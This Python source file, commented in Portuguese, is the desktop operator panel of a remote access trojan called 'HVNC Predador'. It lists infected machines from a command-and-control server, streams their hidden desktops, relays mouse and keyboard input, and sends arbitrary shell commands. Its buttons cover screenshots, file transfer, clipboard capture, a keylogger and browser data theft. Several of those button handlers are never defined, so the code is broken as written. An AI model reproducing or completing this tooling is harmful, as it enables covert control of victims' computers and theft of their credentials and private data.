#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HVNC Predador - Painel Desktop Otimizado
Painel de controle desktop avançado para gerenciar múltiplas sessões HVNC
Versão 2.0 - Interface melhorada com visualização em tempo real
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import threading
import requests
import json
import time
from datetime import datetime, timedelta
import webbrowser
from PIL import Image, ImageTk
import io
import base64
import websocket
import queue
import os
import psutil

class HVNCPanel:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔥 HVNC Predador - Painel de Controle Avançado v2.0")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0d1117')
        self.root.state('zoomed')  # Maximizar janela
        
        # Configurações
        self.server_url = "http://localhost:8080"
        self.ws_url = "ws://localhost:8080"
        self.clients = {}
        self.selected_client = None
        self.update_thread = None
        self.running = False
        self.ws = None
        self.screen_image = None
        self.command_history = []
        
        # Estatísticas de performance
        self.stats = {
            'fps': 0,
            'latency': 0,
            'data_transferred': 0,
            'uptime': datetime.now(),
            'commands_sent': 0,
            'last_activity': datetime.now()
        }
        
        # Queue para comunicação entre threads
        self.image_queue = queue.Queue()
        
        self.setup_ui()
        self.start_monitoring()
        
    def setup_ui(self):
        """Configura a interface do usuário avançada"""
        # Estilo aprimorado
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Dark.TFrame', background='#0d1117')
        style.configure('Dark.TLabel', background='#0d1117', foreground='#f0f6fc')
        style.configure('Dark.TButton', background='#21262d', foreground='#f0f6fc')
        style.configure('Success.TButton', background='#238636', foreground='white')
        style.configure('Danger.TButton', background='#da3633', foreground='white')
        style.configure('Warning.TButton', background='#bf8700', foreground='white')
        
        # Frame principal
        main_frame = ttk.Frame(self.root, style='Dark.TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Header com estatísticas
        header_frame = ttk.Frame(main_frame, style='Dark.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 5))
        
        # Logo e título
        title_frame = ttk.Frame(header_frame, style='Dark.TFrame')
        title_frame.pack(side=tk.LEFT)
        
        title_label = ttk.Label(title_frame, text="🔥 HVNC PREDADOR v2.0", 
                               font=('Segoe UI', 18, 'bold'), style='Dark.TLabel')
        title_label.pack(anchor=tk.W)
        
        subtitle_label = ttk.Label(title_frame, text="Painel de Controle Avançado - RAT Desktop", 
                                  font=('Segoe UI', 10), style='Dark.TLabel')
        subtitle_label.pack(anchor=tk.W)
        
        # Estatísticas em tempo real
        stats_frame = ttk.Frame(header_frame, style='Dark.TFrame')
        stats_frame.pack(side=tk.RIGHT)
        
        self.fps_label = ttk.Label(stats_frame, text="FPS: 0", font=('Consolas', 10), style='Dark.TLabel')
        self.fps_label.pack(side=tk.LEFT, padx=10)
        
        self.latency_label = ttk.Label(stats_frame, text="Latência: 0ms", font=('Consolas', 10), style='Dark.TLabel')
        self.latency_label.pack(side=tk.LEFT, padx=10)
        
        self.data_label = ttk.Label(stats_frame, text="Dados: 0 KB/s", font=('Consolas', 10), style='Dark.TLabel')
        self.data_label.pack(side=tk.LEFT, padx=10)
        
        # Botões do header
        btn_frame = ttk.Frame(header_frame, style='Dark.TFrame')
        btn_frame.pack(side=tk.RIGHT, padx=(0, 20))
        
        ttk.Button(btn_frame, text="🌐 Web Panel", 
                  command=self.open_web_panel, style='Success.TButton').pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="🔄 Refresh", 
                  command=self.refresh_clients, style='Dark.TButton').pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="📊 Stats", 
                  command=self.show_system_stats, style='Warning.TButton').pack(side=tk.LEFT, padx=2)
        
        # Frame de conteúdo principal com 3 colunas
        content_frame = ttk.Frame(main_frame, style='Dark.TFrame')
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Painel esquerdo - Lista de clientes
        left_frame = ttk.Frame(content_frame, style='Dark.TFrame')
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 5))
        left_frame.configure(width=300)
        left_frame.pack_propagate(False)
        
        ttk.Label(left_frame, text="👥 Clientes Conectados", 
                 font=('Segoe UI', 12, 'bold'), style='Dark.TLabel').pack(anchor=tk.W, pady=(0, 5))
        
        # Treeview para clientes com mais informações
        columns = ('ID', 'IP', 'OS', 'Status')
        self.clients_tree = ttk.Treeview(left_frame, columns=columns, show='headings', height=12)
        
        # Configurar colunas
        self.clients_tree.heading('ID', text='ID')
        self.clients_tree.heading('IP', text='IP Address')
        self.clients_tree.heading('OS', text='Sistema')
        self.clients_tree.heading('Status', text='Status')
        
        self.clients_tree.column('ID', width=60)
        self.clients_tree.column('IP', width=120)
        self.clients_tree.column('OS', width=80)
        self.clients_tree.column('Status', width=80)
        
        scrollbar_clients = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.clients_tree.yview)
        self.clients_tree.configure(yscrollcommand=scrollbar_clients.set)
        
        self.clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_clients.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.clients_tree.bind('<<TreeviewSelect>>', self.on_client_select)
        
        # Painel central - Visualização de desktop
        center_frame = ttk.Frame(content_frame, style='Dark.TFrame')
        center_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        # Header do visualizador
        viewer_header = ttk.Frame(center_frame, style='Dark.TFrame')
        viewer_header.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(viewer_header, text="🖥️ Desktop Remoto - HVNC", 
                 font=('Segoe UI', 12, 'bold'), style='Dark.TLabel').pack(side=tk.LEFT)
        
        self.client_info_label = ttk.Label(viewer_header, text="Nenhum cliente selecionado", 
                                          font=('Segoe UI', 9), style='Dark.TLabel')
        self.client_info_label.pack(side=tk.RIGHT)
        
        # Canvas para exibir desktop
        self.desktop_canvas = tk.Canvas(center_frame, bg='#161b22', highlightthickness=1, 
                                       highlightbackground='#30363d')
        self.desktop_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Controles de mouse e teclado
        self.desktop_canvas.bind('<Button-1>', self.on_mouse_click)
        self.desktop_canvas.bind('<Button-3>', self.on_mouse_right_click)
        self.desktop_canvas.bind('<Motion>', self.on_mouse_move)
        self.desktop_canvas.bind('<KeyPress>', self.on_key_press)
        self.desktop_canvas.focus_set()
        
        # Painel direito - Controles avançados
        right_frame = ttk.Frame(content_frame, style='Dark.TFrame')
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=(5, 0))
        right_frame.configure(width=280)
        right_frame.pack_propagate(False)
        
        # Seção de controles rápidos
        ttk.Label(right_frame, text="⚡ Ações Rápidas", 
                 font=('Segoe UI', 12, 'bold'), style='Dark.TLabel').pack(anchor=tk.W, pady=(0, 5))
        
        quick_frame = ttk.Frame(right_frame, style='Dark.TFrame')
        quick_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Primeira linha de botões
        row1 = ttk.Frame(quick_frame, style='Dark.TFrame')
        row1.pack(fill=tk.X, pady=2)
        ttk.Button(row1, text="📸 Screenshot", command=self.take_screenshot, 
                  style='Success.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        ttk.Button(row1, text="💻 SysInfo", command=self.get_system_info, 
                  style='Dark.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # Segunda linha de botões
        row2 = ttk.Frame(quick_frame, style='Dark.TFrame')
        row2.pack(fill=tk.X, pady=2)
        ttk.Button(row2, text="📁 Files", command=self.open_file_manager, 
                  style='Dark.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        ttk.Button(row2, text="⌨️ CMD", command=self.send_custom_command, 
                  style='Warning.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # Terceira linha de botões
        row3 = ttk.Frame(quick_frame, style='Dark.TFrame')
        row3.pack(fill=tk.X, pady=2)
        ttk.Button(row3, text="🔄 Restart", command=self.restart_client, 
                  style='Warning.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        ttk.Button(row3, text="🔌 Disconnect", command=self.disconnect_client, 
                  style='Danger.TButton').pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # Seção de controles avançados
        ttk.Label(right_frame, text="🛠️ Controles Avançados", 
                 font=('Segoe UI', 12, 'bold'), style='Dark.TLabel').pack(anchor=tk.W, pady=(15, 5))
        
        advanced_frame = ttk.Frame(right_frame, style='Dark.TFrame')
        advanced_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Button(advanced_frame, text="🔑 Keylogger", command=self.toggle_keylogger, 
                  style='Dark.TButton').pack(fill=tk.X, pady=1)
        ttk.Button(advanced_frame, text="📋 Clipboard", command=self.get_clipboard, 
                  style='Dark.TButton').pack(fill=tk.X, pady=1)
        ttk.Button(advanced_frame, text="🌐 Browser Data", command=self.steal_browser_data, 
                  style='Dark.TButton').pack(fill=tk.X, pady=1)
        ttk.Button(advanced_frame, text="📤 Upload File", command=self.upload_file, 
                  style='Dark.TButton').pack(fill=tk.X, pady=1)
        ttk.Button(advanced_frame, text="📥 Download File", command=self.download_file, 
                  style='Dark.TButton').pack(fill=tk.X, pady=1)
        
        # Histórico de comandos
        ttk.Label(right_frame, text="📜 Histórico de Comandos", 
                 font=('Segoe UI', 11, 'bold'), style='Dark.TLabel').pack(anchor=tk.W, pady=(15, 5))
        
        self.history_listbox = tk.Listbox(right_frame, height=8, bg='#161b22', fg='#f0f6fc', 
                                         font=('Consolas', 8), selectbackground='#21262d')
        self.history_listbox.pack(fill=tk.X, pady=(0, 10))
        
        # Log de atividades
        ttk.Label(right_frame, text="📋 Log de Atividades", 
                 font=('Segoe UI', 11, 'bold'), style='Dark.TLabel').pack(anchor=tk.W, pady=(5, 5))
        
        self.log_text = scrolledtext.ScrolledText(right_frame, height=12, width=35,
                                                 bg='#0d1117', fg='#f0f6fc', font=('Consolas', 8),
                                                 insertbackground='#f0f6fc')
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Status bar
        status_frame = ttk.Frame(main_frame, style='Dark.TFrame')
        status_frame.pack(fill=tk.X, pady=(10, 0))
        
        self.status_label = ttk.Label(status_frame, text="🔴 Desconectado", style='Dark.TLabel')
        self.status_label.pack(side=tk.LEFT)
        
        self.clients_count_label = ttk.Label(status_frame, text="Clientes: 0", style='Dark.TLabel')
        self.clients_count_label.pack(side=tk.RIGHT)
        
    def log_message(self, message):
        """Adiciona mensagem ao log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        
    def start_monitoring(self):
        """Inicia o monitoramento de clientes"""
        self.running = True
        self.update_thread = threading.Thread(target=self.update_clients_loop, daemon=True)
        self.update_thread.start()
        self.log_message("Sistema iniciado - Monitorando clientes...")
        
    def update_clients_loop(self):
        """Loop de atualização de clientes"""
        while self.running:
            try:
                self.refresh_clients()
                time.sleep(2)  # Atualiza a cada 2 segundos
            except Exception as e:
                self.log_message(f"Erro na atualização: {str(e)}")
                time.sleep(5)
                
    def refresh_clients(self):
        """Atualiza a lista de clientes"""
        try:
            response = requests.get(f"{self.server_url}/api/clients", timeout=5)
            if response.status_code == 200:
                clients_data = response.json()
                self.update_clients_display(clients_data)
                self.status_label.config(text="🟢 Conectado")
            else:
                self.status_label.config(text="🔴 Erro no servidor")
        except requests.exceptions.RequestException:
            self.status_label.config(text="🔴 Servidor offline")
            
    def update_clients_display(self, clients_data):
        """Atualiza a exibição dos clientes com mais informações"""
        # Limpa a árvore
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
            
        # Adiciona clientes
        client_count = 0
        for client_id, client_info in clients_data.items():
            ip = client_info.get('ip', 'N/A')
            os_info = client_info.get('os', 'Windows')[:8]
            status = "🟢 Online" if client_info.get('connected', False) else "🔴 Offline"
            
            self.clients_tree.insert('', tk.END, values=(client_id[:8], ip, os_info, status))
            client_count += 1
            
        self.clients_count_label.config(text=f"Clientes: {client_count}")
        
        # Atualizar estatísticas
        self.update_performance_stats()
        
    def on_client_select(self, event):
        """Evento de seleção de cliente"""
        selection = self.clients_tree.selection()
        if selection:
            item = self.clients_tree.item(selection[0])
            client_id = item['values'][0]  # ID do cliente
            client_ip = item['values'][1]  # IP do cliente
            self.selected_client = client_id
            self.client_info_label.config(text=f"Cliente: {client_id} ({client_ip})")
            self.log_message(f"Cliente selecionado: {client_id} - {client_ip}")
            
            # Iniciar captura de desktop se não estiver ativa
            self.start_desktop_capture()
    
    def start_desktop_capture(self):
        """Inicia a captura de desktop do cliente selecionado"""
        if not self.selected_client:
            return
            
        try:
            # Conectar WebSocket para receber imagens
            if not self.ws or self.ws.sock is None:
                ws_url = f"{self.ws_url}/ws/{self.selected_client}"
                self.ws = websocket.WebSocketApp(ws_url,
                                               on_message=self.on_ws_message,
                                               on_error=self.on_ws_error,
                                               on_close=self.on_ws_close)
                
                # Iniciar WebSocket em thread separada
                ws_thread = threading.Thread(target=self.ws.run_forever, daemon=True)
                ws_thread.start()
                
            self.log_message(f"Iniciando captura de desktop para {self.selected_client}")
        except Exception as e:
            self.log_message(f"Erro ao iniciar captura: {str(e)}")
    
    def on_ws_message(self, ws, message):
        """Processa mensagens WebSocket (imagens do desktop)"""
        try:
            # Decodificar imagem base64
            image_data = base64.b64decode(message)
            image = Image.open(io.BytesIO(image_data))
            
            # Redimensionar para caber no canvas
            canvas_width = self.desktop_canvas.winfo_width()
            canvas_height = self.desktop_canvas.winfo_height()
            
            if canvas_width > 1 and canvas_height > 1:
                image = image.resize((canvas_width, canvas_height), Image.Resampling.LANCZOS)
                
                # Converter para PhotoImage
                photo = ImageTk.PhotoImage(image)
                
                # Atualizar canvas na thread principal
                self.root.after(0, self.update_desktop_display, photo)
                
                # Atualizar estatísticas
                self.stats['last_activity'] = datetime.now()
                self.stats['data_transferred'] += len(message)
                
        except Exception as e:
            self.log_message(f"Erro ao processar imagem: {str(e)}")
    
    def update_desktop_display(self, photo):
        """Atualiza a exibição do desktop no canvas"""
        self.desktop_canvas.delete("all")
        self.desktop_canvas.create_image(0, 0, anchor=tk.NW, image=photo)
        self.screen_image = photo  # Manter referência
    
    def on_ws_error(self, ws, error):
        """Trata erros do WebSocket"""
        self.log_message(f"Erro WebSocket: {str(error)}")
    
    def on_ws_close(self, ws, close_status_code, close_msg):
        """Trata fechamento do WebSocket"""
        self.log_message("Conexão WebSocket fechada")
    
    def on_mouse_click(self, event):
        """Envia clique do mouse para o cliente"""
        if not self.selected_client:
            return
            
        x, y = event.x, event.y
        self.send_mouse_command("click", x, y, 1)
    
    def on_mouse_right_click(self, event):
        """Envia clique direito do mouse para o cliente"""
        if not self.selected_client:
            return
            
        x, y = event.x, event.y
        self.send_mouse_command("click", x, y, 2)
    
    def on_mouse_move(self, event):
        """Envia movimento do mouse para o cliente"""
        if not self.selected_client:
            return
            
        x, y = event.x, event.y
        self.send_mouse_command("move", x, y)
    
    def on_key_press(self, event):
        """Envia tecla pressionada para o cliente"""
        if not self.selected_client:
            return
            
        key = event.keysym
        self.send_keyboard_command(key)
    
    def send_mouse_command(self, action, x, y, button=1):
        """Envia comando de mouse para o cliente"""
        try:
            command = f"MOUSE:{action}:{x}:{y}:{button}"
            self.send_command_to_client(command)
        except Exception as e:
            self.log_message(f"Erro ao enviar comando de mouse: {str(e)}")
    
    def send_keyboard_command(self, key):
        """Envia comando de teclado para o cliente"""
        try:
            command = f"KEY:{key}"
            self.send_command_to_client(command)
        except Exception as e:
            self.log_message(f"Erro ao enviar comando de teclado: {str(e)}")
    
    def send_command_to_client(self, command):
        """Envia comando genérico para o cliente"""
        try:
            response = requests.post(f"{self.server_url}/api/command", 
                                   json={"client_id": self.selected_client, "command": command},
                                   timeout=5)
            if response.status_code == 200:
                self.add_to_history(command)
                self.stats['commands_sent'] += 1
            else:
                self.log_message(f"Erro ao enviar comando: {response.status_code}")
        except Exception as e:
            self.log_message(f"Erro na comunicação: {str(e)}")
    
    def add_to_history(self, command):
        """Adiciona comando ao histórico"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        history_entry = f"[{timestamp}] {command[:30]}..."
        
        self.command_history.append(history_entry)
        if len(self.command_history) > 50:  # Limitar histórico
            self.command_history.pop(0)
            
        # Atualizar listbox
        self.history_listbox.delete(0, tk.END)
        for entry in self.command_history:
            self.history_listbox.insert(tk.END, entry)
        self.history_listbox.see(tk.END)
    
    def update_performance_stats(self):
        """Atualiza estatísticas de performance"""
        try:
            # Calcular FPS (aproximado)
            now = datetime.now()
            time_diff = (now - self.stats['last_activity']).total_seconds()
            if time_diff > 0:
                self.stats['fps'] = min(60, 1 / max(time_diff, 0.016))  # Max 60 FPS
            
            # Calcular latência (simulada)
            self.stats['latency'] = int(time_diff * 1000) if time_diff < 1 else 999
            
            # Calcular taxa de dados
            uptime = (now - self.stats['uptime']).total_seconds()
            if uptime > 0:
                data_rate = self.stats['data_transferred'] / uptime / 1024  # KB/s
            else:
                data_rate = 0
            
            # Atualizar labels
            self.fps_label.config(text=f"FPS: {int(self.stats['fps'])}")
            self.latency_label.config(text=f"Latência: {self.stats['latency']}ms")
            self.data_label.config(text=f"Dados: {data_rate:.1f} KB/s")
            
        except Exception as e:
            self.log_message(f"Erro ao atualizar estatísticas: {str(e)}")
    
    def show_system_stats(self):
        """Mostra estatísticas do sistema"""
        try:
            cpu_percent = psutil.cpu_percent()
            memory = psutil.virtual_memory()
            uptime = datetime.now() - self.stats['uptime']
            
            stats_text = f"""Estatísticas do Sistema:
            
CPU: {cpu_percent}%
Memória: {memory.percent}%
Uptime: {str(uptime).split('.')[0]}
Comandos Enviados: {self.stats['commands_sent']}
Dados Transferidos: {self.stats['data_transferred'] / 1024 / 1024:.2f} MB"""
            
            messagebox.showinfo("Estatísticas do Sistema", stats_text)
        except Exception as e:
            messagebox.showerror("Erro", f"Erro ao obter estatísticas: {str(e)}")
            
    def take_screenshot(self):
        """Captura screenshot do cliente selecionado"""
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
            
        try:
            response = requests.post(f"{self.server_url}/api/command", 
                                   json={"client_id": self.selected_client, "command": "screenshot"})
            if response.status_code == 200:
                self.log_message(f"Screenshot solicitado para {self.selected_client}")
                messagebox.showinfo("Sucesso", "Screenshot capturado! Verifique o painel web.")
            else:
                messagebox.showerror("Erro", "Falha ao capturar screenshot")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro na comunicação: {str(e)}")
            
    def get_system_info(self):
        """Obtém informações do sistema"""
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
            
        try:
            response = requests.post(f"{self.server_url}/api/command", 
                                   json={"client_id": self.selected_client, "command": "systeminfo"})
            if response.status_code == 200:
                self.log_message(f"Informações do sistema solicitadas para {self.selected_client}")
                messagebox.showinfo("Sucesso", "Informações solicitadas! Verifique o painel web.")
            else:
                messagebox.showerror("Erro", "Falha ao obter informações")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro na comunicação: {str(e)}")
            
    def open_file_manager(self):
        """Abre o gerenciador de arquivos"""
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
            
        try:
            response = requests.post(f"{self.server_url}/api/command", 
                                   json={"client_id": self.selected_client, "command": "FILEMANAGER:"})
            if response.status_code == 200:
                self.log_message(f"Gerenciador de arquivos aberto para {self.selected_client}")
                messagebox.showinfo("Sucesso", "Gerenciador de arquivos iniciado!")
            else:
                messagebox.showerror("Erro", "Falha ao abrir gerenciador")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro na comunicação: {str(e)}")
            
    def send_custom_command(self):
        """Envia comando personalizado"""
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
            
        command = tk.simpledialog.askstring("Comando Personalizado", 
                                           "Digite o comando a ser executado:")
        if command:
            try:
                response = requests.post(f"{self.server_url}/api/command", 
                                       json={"client_id": self.selected_client, "command": f"CMD:{command}"})
                if response.status_code == 200:
                    self.log_message(f"Comando enviado para {self.selected_client}: {command}")
                    messagebox.showinfo("Sucesso", "Comando enviado com sucesso!")
                else:
                    messagebox.showerror("Erro", "Falha ao enviar comando")
            except Exception as e:
                messagebox.showerror("Erro", f"Erro na comunicação: {str(e)}")
                
    def disconnect_client(self):
        """Desconecta cliente selecionado"""
        if not self.selected_client:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
            
        if messagebox.askyesno("Confirmar", f"Desconectar cliente {self.selected_client}?"):
            try:
                response = requests.post(f"{self.server_url}/api/disconnect", 
                                       json={"client_id": self.selected_client})
                if response.status_code == 200:
                    self.log_message(f"Cliente {self.selected_client} desconectado")
                    messagebox.showinfo("Sucesso", "Cliente desconectado!")
                    self.selected_client = None
                else:
                    messagebox.showerror("Erro", "Falha ao desconectar cliente")
            except Exception as e:
                messagebox.showerror("Erro", f"Erro na comunicação: {str(e)}")
                
    def open_web_panel(self):
        """Abre o painel web no navegador"""
        webbrowser.open(self.server_url)
        self.log_message("Painel web aberto no navegador")
        
    def on_closing(self):
        """Evento de fechamento da janela"""
        self.running = False
        if self.update_thread:
            self.update_thread.join(timeout=1)
        self.root.destroy()
        
    def run(self):
        """Executa o painel"""
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()

if __name__ == "__main__":
    try:
        import tkinter.simpledialog
        panel = HVNCPanel()
        panel.run()
    except ImportError as e:
        print(f"Erro: Dependência não encontrada - {e}")
        print("Instale as dependências: pip install pillow requests")
    except Exception as e:
        print(f"Erro ao iniciar painel: {e}")